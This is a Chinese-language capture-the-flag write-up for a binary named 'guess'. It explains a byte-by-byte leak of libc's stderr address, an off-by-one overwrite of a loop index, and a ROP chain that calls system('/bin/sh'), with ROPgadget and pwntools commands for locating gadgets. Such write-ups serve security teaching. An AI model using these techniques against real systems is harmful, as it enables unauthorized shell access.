注意事项：guess本应该使用下发的libc.so，但好像下发文件出现了问题，实际上使用的是本地的libc.so，具体查看命令行指令为 `ldd guess` (显示可执行模块的dependency)，我们查询到在我们电脑上使用的是 `/lib/x86_64-linux-gnu/libc.so.6` 。这里就用本地libc.so来代替



**step1.使用IDA进行反汇编并生成pseudo code** 

下面节选了最终的部分，忽略了一部分没有用的代码

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  alarm(0x60u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  while ( 1 )
  {
    sub_9C0();
    if ( (unsigned int)sub_9F0() != 1 )
      break;
    sub_A43();
  }
  return 0LL;
}
```

```c
int sub_9C0()
{
  puts("1. Login to guess");
  puts("2. Exit");
  return printf("Choice: ");
}
```

```c
unsigned __int64 sub_A43()
{
  int i; // [rsp+4h] [rbp-22Ch]
  char buf[256]; // [rsp+10h] [rbp-220h] BYREF
  char v3[16]; // [rsp+110h] [rbp-120h] BYREF
  FILE *v4; // [rsp+120h] [rbp-110h]
  unsigned __int64 v5; // [rsp+218h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  v4 = stderr;
  printf("Account: ");
  read(0, buf, 0x100uLL);
  printf("Password: ");
  read(0, v3, 0x100uLL);
  for ( i = 0; i < strlen(buf); ++i )
  {
    if ( buf[i] != v3[i] )
    {
      puts("Login fail");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  sub_91A();
  return __readfsqword(0x28u) ^ v5;
}
```

```c
unsigned __int64 sub_91A()
{
  char v1[64]; // [rsp+10h] [rbp-50h] BYREF
  int i; // [rsp+50h] [rbp-10h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Welcome, Boss. Leave your valuable comments: ");
  for ( i = 0; i != 65; ++i )
  {
    read(0, &v1[i], 1uLL);
    if ( v1[i] == 10 )
      break;
  }
  return __readfsqword(0x28u) ^ v3;
}
```



**step2.观察上述代码** 

在 `sub_A43()` 我们发现只要Account和Password一样就可以登录成功，而登录成功后我们就可以进入 `sub_91A()` 。

而且我们发现 `sub_91A()` 中有一段for循环，里面有read，并且read是对一个char数组进行读写，**最最重要的是，它代码写错越界了**，它使得我们可以read值到 `v1[64]` 处，而 `v1[64]` 实际上越界到了 `i` 的位置，而这是我们可以利用的。在此基础上另一点是，这段代码读入数组，相当于从一个位置进行偏移，而偏移值 $i$ 也是我们可以自主修改的，我们可以以此修改到 存储函数return pc的栈地址，使得函数结束后跳转到我们指定的位置。

(注： `pc` 在x86中记录在 `rip` (instruction pointer) 中)

另一点是我们需要找到libc中任意一个位置及其在内存中对应的地址，这样才能找到libc中我们需要的对应的地址，包括 **system(),“/bin/sh”(字符串)** 和任何我们需要的libc中的 **gadget** 的地址，而我们发现 `sub_A43()` 中有 `v4 = stderr;`  即 `v4` 中记录了 libc中 `stderr` 的内存地址，而我们要想办法得到这个地址。具体我们可以发现我们会逐位比较 `v3[]` 和 `buf[]` 是否相同而且 `buf[]` 远大于 `v3[]` ，而在内存中 `v3[]` 之后就是 `v4` ，我们可以由此尝试枚举所有可能性枚举出 `v4` 中存储地址的具体值。



**step2.5.登录** 

查看 `sub_A43()` 中的代码

```c
unsigned __int64 sub_A43()
{
  int i; // [rsp+4h] [rbp-22Ch]
  char buf[256]; // [rsp+10h] [rbp-220h] BYREF
  char v3[16]; // [rsp+110h] [rbp-120h] BYREF
  FILE *v4; // [rsp+120h] [rbp-110h]
  unsigned __int64 v5; // [rsp+218h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  v4 = stderr;
  printf("Account: ");
  read(0, buf, 0x100uLL);
  printf("Password: ");
  read(0, v3, 0x100uLL);
  for ( i = 0; i < strlen(buf); ++i )
  {
    if ( buf[i] != v3[i] )
    {
      puts("Login fail");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  sub_91A();
  return __readfsqword(0x28u) ^ v5;
}
```

我们需要注意到的是 `read()` 和 `scanf()` 不同，它并不会在最后读入 `\0` ，而 `strlen()` 会比较到 `\0` ，所以如果我们要登录要注意输入的数据要在最后加上 `\0` (当然要注意如果使用键盘输入是无法做到这一点的)



**step3.得到libc中stderr的内存地址** 

查看 `sub_A43()` 中的代码

```c
unsigned __int64 sub_A43()
{
  int i; // [rsp+4h] [rbp-22Ch]
  char buf[256]; // [rsp+10h] [rbp-220h] BYREF
  char v3[16]; // [rsp+110h] [rbp-120h] BYREF
  FILE *v4; // [rsp+120h] [rbp-110h]
  unsigned __int64 v5; // [rsp+218h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  v4 = stderr;
  printf("Account: ");
  read(0, buf, 0x100uLL);
  printf("Password: ");
  read(0, v3, 0x100uLL);
  for ( i = 0; i < strlen(buf); ++i )
  {
    if ( buf[i] != v3[i] )
    {
      puts("Login fail");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  sub_91A();
  return __readfsqword(0x28u) ^ v5;
}
```

通过 **step2** 的分析，我们知道我们可以让 `buf[]` 和 `v3[]` 的前16字节全部填满，而且填的是相同的字符串，如 `aaaaaaaaaaaaaaaa` 

再枚举 `buf[]` 后面几字节的值，直至它和 `v4` 中存储的地址完全匹配即为登录成功。由此我们既得到了libc中stderr的内存地址，又完成了登录。(考虑到直接枚举复杂度过大，我们可以考虑每次枚举一个字节，登录成功后再主动退出，如此逐位确定stderr的内存地址)

具体枚举 `buf[]` 后面几字节的值，我们需要知道的是x86中一个地址64位，占8字节，但是实际上虚拟地址只有48位，所以我们只需要依次枚举出后面的6字节即可(注意x86/x64是小端序)

(注意一点是，我们必须祈祷 `stderr` 的6字节的虚拟地址中不存在一个字节为0(0~255)，但幸运的是这里确实是这样的)



**step4.找到各个地址的位置** 

主要使用的两个工具是ROPgadget和python中的 `pwn.ELF` 



**使用ROPgadget** 

使用ROPgadget得到还未重定向的libc中"/bin/sh"字符串的地址

```
./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh"
```



考虑我们需要的两个gadget

gadget1

```
pop $rdi; ret
```

使用ROPgadget得到还未重定向的libc中gadget1的地址

```
./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
```



gadget2

```
ret
```

使用ROPgadget得到还未重定向的libc中gadget2的地址

```
./ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret"
```



**使用pwn.ELF** 

```
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_addr=libc.symbols["system"]
stderr_addr=libc.symbols["_IO_2_1_stderr_"]
```

使用pwn.ELF可以得到symbol table中函数的地址，由此可以得到还未重定向的libc中函数的地址



得到还未重定向的libc中 `system()` 的地址

```
libc.symbols["system"]
```



得到还未重定向的libc中 `stderr` 的地址

`stderr` 实际是一个宏定义，它指向的实际上是 `_IO_2_1_stderr_()` （ 如何得知其指向的是为 `IO_2_1_stderr_()` ? 当然是问别人啦（（（ ）

```
libc.symbols["_IO_2_1_stderr_"]
```



由此我们可以得知 `stderr,system(),"/bin/sh",gadget1,gadget2` 之间的相对地址(由所有它们的未重定向的地址得知)，又由我们之前已经得知 `stderr` 的绝对地址，由此我们可以得知上述我们需要的所有地址



**step5.利用错误进行设计，达成最终调用system("/bin/sh")** 

查看 `sub_91A()` 中的代码

```
unsigned __int64 sub_91A()
{
  char v1[64]; // [rsp+10h] [rbp-50h] BYREF
  int i; // [rsp+50h] [rbp-10h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Welcome, Boss. Leave your valuable comments: ");
  for ( i = 0; i != 65; ++i )
  {
    read(0, &v1[i], 1uLL);
    if ( v1[i] == 10 )
      break;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

通过 **step2** 的分析，我们知道我们可以先令程序读入64个字节



接下来输入的一个字节是对 `i` 的修改，我们想要让下一个 `v1[i]` 修改的是记录函数要返回的pc的位置，而这个pc返回值记录在rbp+8的位置上

(*rbp记录的是调用这个函数的函数原来的rbp, *(rbp+8)记录的是原来函数中的下一个rip+4(返回之后的pc))

(return的时候为 `leaveq;req` / `popq %rbp;retq` (取决于当前函数中有没有调用函数，即rsp能否在函数中一点不变化))

又从伪代码中我们发现 `v1` 的基地址为rbp-0x50，由此我们得知我们应该让 `i=0x58-1` (因为 `i` 要+1)

(注意x86-64是小端序，而i本来是64，高24位都为0，所以这里修改最低1字节为0x57，即为把i修改为0x57)



此时的位置即为记录函数要返回的pc的位置，我们把它修改成gadget1_addr，再把下一位置修改成bin_sh_addr，即实现了把rdi修改成bin_sh_addr

gadget1具体为 `pop $rdi; ret` 



再把下一位置修改成gadget2_addr，这里gadget2_addr相当于什么都没做，它的目的是为了使rsp+8，能够16位对齐(因为system函数中执行了一个movaps指令，这个指令要求rsp一定要16字节对齐，否则会RE)

gadget2具体为 `ret` 



再把下一位置修改成system_addr，即完成进入system()的过程，由此我们实现了在./guess中调用system("/bin/sh")，打开了sh



最后再输入一个换行符(ascii为10)，使得sub_91A()中的循环能够退出，这样才能在 `sub_91A()` return语句之后进入gadget1_addr



**整体流程为:** 

* 我们在写入64个随机字节后，接着修改了 **i** ，接着从rbp-8位置开始依次加入了gadget1_addr, bin_sh_addr, gadget2_addr, system_addr
* `sub_91A()` 开始执行return，此时它先把rsp改成和rbp一样，再 `pop $rbp` 把rbp改回去(实际上这里原rbp已经被我们修改了，所以它改的是一个错误的值，但并不影响)，接着 `pop $rip` 尝试把pc改回去，但此时原pc已经被我们修改成了gadget1_addr，所以接下来将开始执行gadget1
* gadget1具体为 `pop $rdi; ret` ，它先 `pop $rdi` ，即把我们存放的bin_sh_addr存入 `$rdi` 中，接着执行 `ret` 即 `pop $rip` ，把pc改回了我们存放的gadget2_addr，所以接下来将开始执行gadget2
* gadget2具体为 `ret` ，我们开始执行 `ret` 即 `pop $rip` ，把pc改回了我们存放的system_addr，所以接下来将开始执行system_addr

此时我们成功的进入了system()，并且我们传入的唯一参数存放在 `$rdi` 中，其中存放的恰好就是我们想要的"/bin/sh"字符串位置，由此我们实现了在给定的vulnerable的 `./guess` 中通过输入输出交互成功调用system("/bin/sh")，在程序中打开了终端